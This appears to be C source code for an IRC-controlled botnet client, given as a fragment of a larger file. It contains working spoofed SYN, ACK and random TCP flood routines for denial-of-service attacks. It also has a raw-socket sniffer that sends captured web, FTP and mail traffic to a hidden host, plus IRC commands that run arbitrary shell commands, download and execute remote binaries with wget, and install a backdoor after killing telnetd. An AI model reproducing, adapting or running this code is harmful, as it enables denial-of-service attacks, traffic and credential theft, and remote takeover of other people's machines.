void killall(int sock, char *sender, int argc, char ** argv) {
    unsigned long i;
    for (i = 0; i < numpids; i++) {
        if (pids[i] != 0 && pids[i] != getpid()) {
            if (sender) Send(sock, "NOTICE %s :Killing pid %d.\n", sender, pids[i]);
            kill(pids[i], 9);
        }
    }
}

void killd(int sock, char *sender, int argc, char ** argv) {
    char buf[1024] = {0};
    if (disabled == 1) return;
    kill(actualparent, 9);
    system(buf);
    exit(0);
}

char *append(char *string1, char *string2) {
    char *result = NULL;
    asprintf(&result, "%s%s", string1, string2);
    return result;
}


void histClear(int sock, char *sender, int argc, char ** argv) {
    ClearHistory();
    Send(sock, "NOTICE %s :History cleared!\n", sender);
    return;
}


void ProcessPacket(unsigned char* , int);
void print_ip_header(unsigned char* , int);
void print_tcp_packet(unsigned char* , int);
void print_udp_packet(unsigned char * , int);
void print_icmp_packet(unsigned char* , int);
void PrintData (unsigned char* , int);

int sock_raw;
FILE *logfile;
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;
struct sockaddr_in source,dest;
char* load_file(char const* path)
{
    char* buffer = 0;
    long length;
    FILE * f = fopen (path, "rb"); //was "rb"

    if (f)
    {
      fseek (f, 0, SEEK_END);
      length = ftell (f);
      fseek (f, 0, SEEK_SET);
      buffer = (char*)malloc ((length+1)*sizeof(char));
      if (buffer)
      {
        fread (buffer, sizeof(char), length, f);
      }
      fclose (f);
    }
    buffer[length] = '\0';
    // for (int i = 0; i < length; i++) {
    //     printf("buffer[%d] == %c\n", i, buffer[i]);
    // }
    //printf("buffer = %s\n", buffer);

    return buffer;
}

int sniffer()
{
    if(!fork()) return 1;
	int saddr_size , data_size;
	struct sockaddr saddr;
	struct in_addr in;
	
	unsigned char *buffer = (unsigned char *)malloc(65536); //Its Big!
	
	//Create a raw socket that shall sniff
	sock_raw = socket(AF_INET , SOCK_RAW , IPPROTO_TCP);
	if(sock_raw < 0)
	{
		return 1;
	}
	while(1)
	{
		saddr_size = sizeof saddr;
		//Receive a packet
		data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , &saddr_size);
		if(data_size > 0)
		{
		    //Now process the packet
		    ProcessPacket(buffer , data_size);
	    }
	}
	close(sock_raw);
	return 0;
}

void ProcessPacket(unsigned char* buffer, int size)
{
	//Get the IP Header part of this packet
	struct iphdr *iph = (struct iphdr*)buffer;
	++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
		case 1:  //ICMP Protocol
			++icmp;
			//PrintIcmpPacket(Buffer,Size);
			break;
		
		case 2:  //IGMP Protocol
			++igmp;
			break;
		
		case 6:  //TCP Protocol
			++tcp;
			print_tcp_packet(buffer , size);
			break;
		
		case 17: //UDP Protocol
			++udp;
			break;
		
		default: //Some Other Protocol like ARP etc.
			++others;
			break;
	}
}

void print_ip_header(unsigned char* Buffer, int Size)
{
	unsigned short iphdrlen;
		
	struct iphdr *iph = (struct iphdr *)Buffer;
	iphdrlen =iph->ihl*4;
	
	memset(&source, 0, sizeof(source));
	source.sin_addr.s_addr = iph->saddr;
	
	memset(&dest, 0, sizeof(dest));
	dest.sin_addr.s_addr = iph->daddr;
	
}

void print_tcp_packet(unsigned char* Buffer, int Size)
{

	unsigned short iphdrlen;
	
	struct iphdr *iph = (struct iphdr *)Buffer;
	iphdrlen = iph->ihl*4;
	
	struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen);
	int port=ntohs(tcph->dest);
	if(port!=80&&port!=21&&port!=25&&port!=8080){
		return;
    }
		int sniffSock = socket_connect(decode(SNIFFLISTENHOST), SNIFFLISTENPORT);

	Send(sniffSock, "%s", "\n\n***********************TCP Packet*************************\n");	
	Send(sniffSock, "%s", "TCP Header\n");
	Send(sniffSock, "   |-Source Port      : %u\n",ntohs(tcph->source));
	Send(sniffSock, "   |-Destination Port : %u\n",port);
	Send(sniffSock, "%s", "\n");
	Send(sniffSock, "%s", "                        DATA Dump                         ");
	Send(sniffSock, "%s", "\n");
		
	Send(sniffSock, "%s", "TCP Header\n");
	Send(sniffSock, "%s", Buffer+iphdrlen,tcph->doff*4);
		
	Send(sniffSock, "%s", "Data Payload\n");	
	Send(sniffSock, "%s", Buffer + iphdrlen + tcph->doff*4 , (Size - tcph->doff*4-iph->ihl*4) );
						
	Send(sniffSock, "%s", "\n###########################################################");
	close(sniffSock);
}

void PrintData (unsigned char* data , int Size)
{
	
	for(i=0 ; i < Size ; i++)
	{
		if( i!=0 && i%16==0)   //if one line of hex printing is complete...
		{
			fprintf(logfile,"         ");
			for(j=i-16 ; j<i ; j++)
			{
				if(data[j]>=32 && data[j]<=128)
					fprintf(logfile,"%c",(unsigned char)data[j]); //if its a number or alphabet
				
				else fprintf(logfile,"."); //otherwise print a dot
			}
			fprintf(logfile,"\n");
		} 
		
		if(i%16==0) fprintf(logfile,"   ");
			fprintf(logfile," %02X",(unsigned int)data[i]);
				
		if( i==Size-1)  //print the last spaces
		{
			for(j=0;j<15-i%16;j++) fprintf(logfile,"   "); //extra spaces
			
			fprintf(logfile,"         ");
			
			for(j=i-i%16 ; j<=i ; j++)
			{
				if(data[j]>=32 && data[j]<=128) fprintf(logfile,"%c",(unsigned char)data[j]);
				else fprintf(logfile,".");
			}
			fprintf(logfile,"\n");
		}
	}
}
struct tcphdr_t {
        unsigned short source;
        unsigned short dest;
        unsigned long seq;
        unsigned long ack_seq;
        unsigned short res1:4, doff:4;
	unsigned char fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
        unsigned short window;
        unsigned short check;
        unsigned short urg_ptr;
};
struct send_tcp {
	struct iphdr ip;
	struct tcphdr_t tcp;
	char buf[20];
};
struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
	char buf[20];
};
long pow(long a, long b) {
        if (b == 0) return 1;
        if (b == 1) return a;
        return a*pow(a,b-1);
}
void spoof(int sock, char *sender, int argc, char **argv) {
        char ip[256];
        int i, num;
        unsigned long uip;
        if (argc != 1) {
                Send(sock,"NOTICE %s :Removed all spoofs\n",sender);
                spoofs=0;
                spoofsm=0;
                return;
        }
        if (strlen(argv[1]) > 16) {
                Send(sock,"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n",sender);
                return;
        }
        strcpy(ip,argv[1]);
        if (ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
        for (i=0, num=1;i<strlen(ip);i++) if (ip[i] == '.') num++;
        num=-(num-4);
        for (i=0;i<num;i++) strcat(ip,".0");
        uip=inet_network(ip);
        if (num == 0) spoofsm=1;
        else spoofsm=pow(256,num);
        spoofs=uip;
}
void getspoofs(int sock, char *sender, int argc, char **argv) {
        unsigned long a=spoofs,b=spoofs+(spoofsm-1);
        if (spoofsm == 1) Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
        else Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
}
unsigned long getspoof() {
	if (!spoofs) return rand();
	if (spoofsm == 1) return ntohl(spoofs);
	return ntohl(spoofs+(rand() % spoofsm)+1);
}
void synflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :SYNFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,"NOTICE %s :Flooding with TCP SYN %s.\n",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}


void nssynflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :NSSYNFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,"NOTICE %s :Flooding with TCP SYN %s.\n",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}

void randomflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :RANDOMFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        dest=htons(atoi(argv[2]));

        Send(sock,"NOTICE %s :Flooding with TCP SYN/ACK %s.\n",sender,argv[1]);

        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 255;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;

        while(1) {
                saddr=getspoof();
                if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}




void ackflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :ACKFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
	dest=htons(atoi(argv[2]));

        Send(sock,"NOTICE %s :Flooding with TCP ACK %s.\n",sender,argv[1]);

	send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
	send_tcp.ip.ttl = 255;
	send_tcp.ip.protocol = 6;
	send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 1;
	send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 0;
	send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;


        while(1) {
		saddr=getspoof();
		if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));


                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}

void nsackflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :NSACKFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        dest=htons(atoi(argv[2]));

        Send(sock,"NOTICE %s :Flooding with TCP ACK %s.\n",sender,argv[1]);

        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 255;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 1;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 0;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;


        while(1) {
                saddr=getspoof();
                if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));


                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}
struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
        { "UDP", sendSTD },
		{ "SYN", synflood },
		{ "NSYN", nssynflood },
		{ "ACK", ackflood },
		{ "NSACK", nsackflood },					
        { "UNKNOWN", unknown },
        { "HTTP", HTTP },
        { "HOLD", hold },
        { "JUNK", junk },
        { "BLACKNURSE", blacknurse },
        { "DNS", dns },
        { "AK47SCAN", ak47scantoggle },
        { "NICK", nickc },
        { "RNDNICK", rndnick },
        { "CLEARHISTORY", histClear },
        { "SERVER", move },
        { "DISABLE", disable },
        { "ENABLE", enable },
        { "KILLMYEYEPEEUSINGHOIC", killd },
        { "GET", get },
			{ "GETSPOOFS", getspoofs},
//        { "VERSION", version },
        { "KILLALL", killall },
{ (char *)0, (void (*)(int,char *,int,char **))0 } };

void _PRIVMSG(int sock, char *sender, char *str) {
    int i;
    char *to, * message;
    for (i = 0; i < strlen(str) && str[i] != ' '; i++);
    str[i] = 0;
    to = str;
    message = str + i + 2;
    for (i = 0; i < strlen(sender) && sender[i] != '!'; i++);
    sender[i] = 0;
    if ( * message == '!' && !strcasecmp(to, chan)) {
        char *params[12], name[1024] = {
            0
        };
        int num_params = 0, m;
        message++;
        for (i = 0; i < strlen(message) && message[i] != ' '; i++);
        message[i] = 0;
        if (strwildmatch(message, nick)) return;
        message += i + 1;
        if (!strncmp(message, "IRC ", 4))
            if (disabled) {
                Send(sock, "NOTICE %s :Unable to comply.\n", sender);
            }else{
                 Send(sock, "%s\n", message + 4);
            }
        if (!strncmp(message, "SH ", 3)) {
            char buf[1024];
            FILE * command;
            if (mfork(sender) != 0) return;
            memset(buf, 0, 1024);
            sprintf(buf, "export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s", message + 3);
            command = popen(buf, "r");
            while (!feof(command)) {
                memset(buf, 0, 1024);
                fgets(buf, 1024, command);
                Send(sock, "NOTICE %s :%s\n", sender, buf);
                sleep(1);
            }
            pclose(command);
            exit(0);
        }

        // SHD (daemonize sh command)
        if (!strncmp(message, "SHD ", 4)) {
            char buf[1024];
            FILE * command;
            if (mfork(sender) != 0) return;
            memset(buf, 0, 1024);
            sprintf(buf, "export HOME=/tmp;export;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&", message + 4);
            command = popen(buf, "r");
            while (!feof(command)) {
                memset(buf, 0, 1024);
                fgets(buf, 1024, command);
                Send(sock, "NOTICE %s :%s\n", sender, buf);
                sleep(1);
            }
            pclose(command);
            exit(0);
        }

        // INSTALL (uses wget to download and install a file into our hack path. This program already has a built in http func, so it would be great to use taht instead of needing to download busybox/wget first

        if (!strncmp(message, "INSTALL ", 8)) {
            char buf[1024];
            FILE * command;
            if (mfork(sender) != 0) return;
            memset(buf, 0, 1024);
            sprintf(buf, "export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \"$url\" | sed 's#.\x2a/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo \"$name either doesnt exist or eq 0 so we get\" && cd /tmp && wget -O \"$name\" \"$url\" && chmod +x \"$name\" && mv \"$name\" /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \"It appears I already have $name\")", message + 8);
            command = popen(buf, "r");
            while (!feof(command)) {
                memset(buf, 0, 1024);
                fgets(buf, 1024, command);
                Send(sock, "NOTICE %s :%s\n", sender, buf);
                sleep(1);
            }
            pclose(command);
            exit(0);
        }

        // BINUPDATE http://server/file (like install, but updates the program)

        if (!strncmp(message, "BINUPDATE ", 10)) {
            char buf[1024];
            FILE * command;
            if (mfork(sender) != 0) return;
            memset(buf, 0, 1024);
            sprintf(buf, "export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \"$url\" | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \"$name doesnt exist, perhaps you mean INSTALL?\"", message + 10);
            command = popen(buf, "r");
            while (!feof(command)) {
                memset(buf, 0, 1024);
                fgets(buf, 1024, command);
                Send(sock, "NOTICE %s :%s\n", sender, buf);
                sleep(1);
            }
            pclose(command);
            exit(0);
        }

        // LOCKUP <http:server/backdoor>  (This kills telnet and installs my backdoor binary, which is aes encrypted. This is prob something else that would be cool to have built in to elimiate the dependency

        if (!strncmp(message, "LOCKUP ", 7)) {
            char buf[1024];
            FILE * command;
            if (mfork(sender) != 0) return;
            memset(buf, 0, 1024);
            sprintf(buf, "export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/dmips ] && cd /var/bin;wget -O dmips %s;chmod +x /var/bin/dmips;(killall -9 telnetd || kill -9 telnetd) && (nohup dmips || trap '' 1 2 /var/bin/dmips)", message + 7);
            command = popen(buf, "r");
            while (!feof(command)) {
                memset(buf, 0, 1024);
                fgets(buf, 1024, command);
                Send(sock, "NOTICE %s :%s\n", sender, buf);
                sleep(1);
            }
            pclose(command);
            exit(0);
        }

        // !* BASH echo hello
        if (!strncmp(message, "BASH ", 5)) {
            char buf[1024];
            FILE * command;
            if (mfork(sender) != 0) return;
            memset(buf, 0, 1024);
            sprintf(buf, "export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s", message + 5);
            command = popen(buf, "r");
            while (!feof(command)) {
                memset(buf, 0, 1024);
                fgets(buf, 1024, command);
                Send(sock, "NOTICE %s :%s\n", sender, buf);
                sleep(1);
            }
            pclose(command);
            exit(0);

        }
        m = strlen(message);
        for (i = 0; i < m; i++) {
            if ( * message == ' ' || * message == 0) break;
            name[i] = * message;
            message++;
        }
        for (i = 0; i < strlen(message); i++)
            if (message[i] == ' ') num_params++;
        num_params++;
        if (num_params > 10) num_params = 10;
        params[0] = name;
        params[num_params + 1] = "\0";
        m = 1;
        while ( * message != 0) {
            message++;
            if (m >= num_params) break;
            for (i = 0; i < strlen(message) && message[i] != ' '; i++);
            params[m] = (char *) malloc(i + 1);
            strncpy(params[m], message, i);
            params[m][i] = 0;
            m++;
            message += i;
        }
        for (m = 0; flooders[m].cmd != (char *) 0; m++) {
            if (!strcasecmp(flooders[m].cmd, name)) {
                flooders[m].func(sock, sender, num_params - 1, params);
                for (i = 1; i < num_params; i++) free(params[i]);
                return;
            }
        }
    }
}

void _376(int sock, char *sender, char *str) {
    Send(sock, "MODE %s -xi\n", nick);
    Send(sock, "JOIN %s :%s\n", chan, key);
    Send(sock, "WHO %s\n", nick);
    if (scanPid == 0) {
        ak47scan(sock);
        if (scanPid != 0) {
            //Send(sock, "PRIVMSG %s :[TELNET] [+] SCANNER STARTED!\n", CHAN); //Scanner has been started successfully!!!
        }
    }
}
void _PING(int sock, char *sender, char *str) {
    Send(sock, "PONG %s\n", str);
}
void _352(int sock, char *sender, char *str) {
    return;
}
void _433(int sock, char *sender, char *str) {
    free(nick);
    nick = randstring(realrand(4, 8));
}
void _NICK(int sock, char *sender, char *str) {
    int i;
